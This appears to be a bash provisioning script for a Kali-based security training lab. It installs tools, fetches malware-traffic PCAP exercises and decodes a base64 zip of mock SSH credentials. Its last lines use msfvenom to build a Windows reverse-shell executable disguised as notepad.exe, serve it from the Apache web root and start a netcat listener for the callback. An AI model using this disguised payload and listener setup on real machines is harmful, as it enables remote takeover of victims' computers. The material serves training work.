#! /usr/bin/env bash

# https://serverfault.com/questions/48724/100-non-interactive-debian-dist-upgrade
sudo ip link set eth1 down && sudo ip link set eth1 up
#sudo export DEBIAN_FRONTEND=noninteractive
#sudo export APT_LISTCHANGES_FRONTEND=none
#sudo apt-get update && sudo apt-get -o Dpkg::Options::="--force-confnew" upgrade -q -y --allow-downgrades --allow-remove-essential --allow-change-held-packages && sudo apt-get -o Dpkg::Options::="--force-confnew" dist-upgrade -q -y --allow-downgrades --allow-remove-essential --allow-change-held-packages
sudo apt-get update && sudo apt-get install exploitdb
mkdir ~/Desktop/Learning && cd ~/Desktop/Learning
git clone https://github.com/sbousseaden/PCAP-ATTACK.git PCAP_sample
chmod +x /home/vagrant/kali_installsilk.sh && /home/vagrant/kali_installsilk.sh
echo "UEsDBAoAAAAAAK68eU4ylQFk1QEAANUBAAAbABwAbW9ja19zc2hfbG9naW4vdXNlcm5hbWUuemlwVVQJAAM4ZplcPmaZXHV4CwABBFFz7EQEFSD7DVBLAwQKAAkAAACnvHlOMoikzwUBAAD5AAAAFQAcAHVzZXJuYW1lL3Bhc3N3b3JkLnppcFVUCQADKWaZXC1mmVx1eAsAAQRRc+xEBBUg+w3s2wGmKH0aneydVwTF+xY5bNddx4pXHJEHXIuwEyPlW08k0+yEfoP3qxvF/OzQKvxUfi6jfPHV8jikDypUOypCwqPTTctSbUXn5G/AkYmHK7fE2BNP9aSiLfA/hrdGYSIPmaYEtAhEc+5XVsFAD3crc+cdiQZiSnCGOe+zxPdqE9eH3G9pIQjRJ3blo6/dDLvP8XfLuNP9Bp+hA6eLE51YzqFPWSBP2hzmOeonZIYFkvNVFS1z+NouYmSccVoURx8D9ftoQnLO63gV63CwOq7ZqBf/jwguYSn6APGosmhOQiQPnmaU+oxr2hv920hSa8zm/0xYJmltgnD6MVyoQyeLuZnWOwxQSwcIMoikzwUBAAD5AAAAUEsBAh4DCgAJAAAAp7x5TjKIpM8FAQAA+QAAABUAGAAAAAAAAAAAAKSBAAAAAHVzZXJuYW1lL3Bhc3N3b3JkLnppcFVUBQADKWaZXHV4CwABBFFz7EQEFSD7DVBLBQYAAAAAAQABAFsAAABkAQAAAABQSwECHgMKAAAAAACuvHlOMpUBZNUBAADVAQAAGwAYAAAAAAAAAAAApIEAAAAAbW9ja19zc2hfbG9naW4vdXNlcm5hbWUuemlwVVQFAAM4ZplcdXgLAAEEUXPsRAQVIPsNUEsFBgAAAAABAAEAYQAAACoCAAAAAA==" | base64 -d > /home/vagrant/lab5.zip
wget https://malware-traffic-analysis.net/2014/11/16/2014-11-16-traffic-analysis-exercise.pcap.zip -O lab2_pcap.zip
unzip -P infected lab2_pcap.zip
mv 2014-11-16-traffic-analysis-exercise.pcap lab2.pcap
wget https://www.malware-traffic-analysis.net/2017/06/28/2017-06-28-traffic-analysis-exercise.pcap.zip -O lab3_pcap.zip
wget https://www.malware-traffic-analysis.net/2017/06/28/2017-06-28-traffic-analysis-exercise-alerts.zip -O lab3_alerts.zip
unzip -P infected lab3_pcap.zip
unzip -P infected lab3_alerts.zip
sudo systemctl enable apache2 && sudo systemctl start apache2
sudo msfvenom -p windows/shell/reverse_tcp LHOST=192.168.56.110 LPORT=1337 -f exe -o /var/www/html/notepad.exe
sudo nc -nlvp 1337 &
